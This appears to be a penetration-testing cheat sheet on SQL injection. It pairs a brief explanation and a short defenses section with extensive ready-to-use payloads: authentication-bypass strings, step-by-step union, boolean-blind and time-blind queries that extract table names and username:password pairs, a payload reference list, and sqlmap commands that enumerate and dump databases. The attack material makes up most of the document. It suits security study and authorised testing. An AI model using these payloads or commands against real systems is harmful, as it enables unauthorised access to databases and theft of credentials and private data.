# SQL Injection

**Category:** Web Vulnerabilities  
**OWASP:** A03 Injection  
**Severity:** Critical — can lead to authentication bypass, data exfiltration, data modification, RCE

---

## What Is SQL Injection

When user input is included in a SQL query without proper sanitization, an attacker can manipulate the query to do things it was never intended to do — read private data, bypass authentication, modify or delete records, or in some cases execute commands on the server.

---

## SQL Basics (What You Need to Know)

```sql
-- Retrieve all columns from a table
SELECT * FROM users;

-- Retrieve specific columns
SELECT username, password FROM users;

-- Limit results
SELECT * FROM users LIMIT 1;

-- Skip first result, return next one
SELECT * FROM users LIMIT 1,1;

-- Filter by condition
SELECT * FROM users WHERE username='admin';

-- Wildcard matching
SELECT * FROM users WHERE username LIKE 'a%';   -- starts with a
SELECT * FROM users WHERE username LIKE '%n';   -- ends with n
SELECT * FROM users WHERE username LIKE '%mi%'; -- contains mi

-- Combine results from two tables (same column count required)
SELECT name,address FROM customers UNION SELECT company,address FROM suppliers;

-- Insert data
INSERT INTO users (username,password) VALUES ('bob','password123');

-- Update data
UPDATE users SET password='newpass' WHERE username='admin';

-- Delete data
DELETE FROM users WHERE username='martin';
DELETE FROM users; -- deletes everything
```

**Key character:** `;` ends a SQL statement. `--` starts a comment (everything after is ignored).

---

## Types of SQL Injection

### 1. In-Band — Error Based
Error messages from the database are returned directly to the browser. Easiest to exploit — errors reveal database structure.

**Signal:** Put a `'` in an input field. If you get a database error — SQLi exists.

### 2. In-Band — Union Based
Uses UNION SELECT to append additional query results to the original response. Most common method for extracting large amounts of data.

### 3. Blind — Boolean Based
No error messages visible. Application returns true/false responses. You enumerate data one character at a time by asking yes/no questions.

### 4. Blind — Time Based
No visible response difference. Use SLEEP() to cause delays — if the query sleeps, it worked.

### 5. Out-of-Band
Data exfiltrated through a separate channel (DNS, HTTP request to attacker-controlled server). Requires specific database features to be enabled. Less common.

---

## Detection

```
# Test for SQLi by breaking the query
'
"
')
"))
' OR '1'='1
' OR 1=1--
```

If any of these cause an error, unexpected behavior, or different response — SQLi likely exists.

---

## Exploitation Techniques

### Authentication Bypass

The login query typically looks like:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT' LIMIT 1;
```

Bypass by making the query always return true:
```
Username: admin'--
Password: anything

-- Results in:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check is commented out
```

Or in the password field:
```
' OR 1=1;--

-- Results in:
SELECT * FROM users WHERE username='' AND password='' OR 1=1;
-- 1=1 is always true
```

---

### Union-Based Extraction

**Step 1 — Find number of columns:**
```
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3    ← no error = 3 columns
```

**Step 2 — Make original query return nothing:**
```
0 UNION SELECT 1,2,3
```

**Step 3 — Get database name:**
```
0 UNION SELECT 1,2,database()
```

**Step 4 — Get table names:**
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

**Step 5 — Get column names:**
```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'
```

**Step 6 — Extract data:**
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users
```

---

### Boolean-Based Blind Extraction

No visible output — infer data from true/false responses.

```
# Find number of columns
admin123' UNION SELECT 1,2,3;--    ← true = 3 columns

# Find database name (one character at a time)
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--   ← true = starts with s
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';--  ← true = starts with sq
# Continue until full name found

# Find table names
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='DBNAME' AND table_name LIKE 'u%';--

# Find column names
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema='DBNAME' AND table_name='users' AND column_name LIKE 'a%';--

# Exclude already found columns
... AND column_name LIKE 'a%' AND column_name != 'id';--

# Extract data
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%';--
```

---

### Time-Based Blind Extraction

No visible response difference — use SLEEP() to confirm.

```sql
# Test for vulnerability
admin123' UNION SELECT SLEEP(5);--         ← no delay = wrong columns
admin123' UNION SELECT SLEEP(5),2;--       ← 5 second delay = 2 columns confirmed

# Enumerate using same boolean technique but with SLEEP
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
# Delay = true, no delay = false
```

---

## information_schema — The Attacker's Map

Every MySQL/MariaDB database has `information_schema` — a meta-database containing details about all other databases, tables, and columns. Always available to any authenticated user.

```sql
-- All databases
SELECT schema_name FROM information_schema.schemata;

-- All tables in a database
SELECT table_name FROM information_schema.tables WHERE table_schema='TARGET_DB';

-- All columns in a table
SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE';
```

---

## Useful Functions

| Function | What It Does |
|---|---|
| `database()` | Returns current database name |
| `version()` | Returns database version |
| `user()` | Returns current database user |
| `group_concat()` | Combines multiple rows into one string |
| `SLEEP(n)` | Pauses query for n seconds |
| `LOAD_FILE('/etc/passwd')` | Reads server file (if FILE privilege) |

---

## Common Payloads Reference

```
# Comment out rest of query
--
-- -
#
/*

# Auth bypass
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x
') OR ('1'='1

# Error triggering
'
"
`
')
"))

# UNION columns detection
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--   ← error here = 2 columns
```

---

## Automated Tools

```bash
# SQLMap — automated SQLi detection and exploitation
sqlmap -u "http://TARGET/page?id=1"
sqlmap -u "http://TARGET/page?id=1" --dbs          # enumerate databases
sqlmap -u "http://TARGET/page?id=1" -D DBNAME --tables  # enumerate tables
sqlmap -u "http://TARGET/page?id=1" -D DBNAME -T TABLENAME --dump  # dump table

# With POST request
sqlmap -u "http://TARGET/login" --data="username=admin&password=test"

# With cookie
sqlmap -u "http://TARGET/page" --cookie="session=TOKEN"
```

---

## Defenses (Developer Perspective)

**Prepared statements** — SQL query structure defined first, user input added separately as parameters. Database treats input as data, never as SQL code.

**Input validation** — allowlist acceptable input, reject anything unexpected.

**Escaping user input** — prepend backslash to special characters so they're treated as literals not SQL syntax.

---

## Pentest Notes

- Always test `'` first — simplest way to break a SQL query
- `information_schema` is your roadmap to the entire database
- Union-based is fastest when errors are visible
- Boolean/time-based when errors are suppressed but injection still works
- `group_concat()` is essential for getting multiple results in one response
- SQLMap automates all of this but understand the manual technique first
- Out-of-band via DNS is useful when the app has no visible output at all
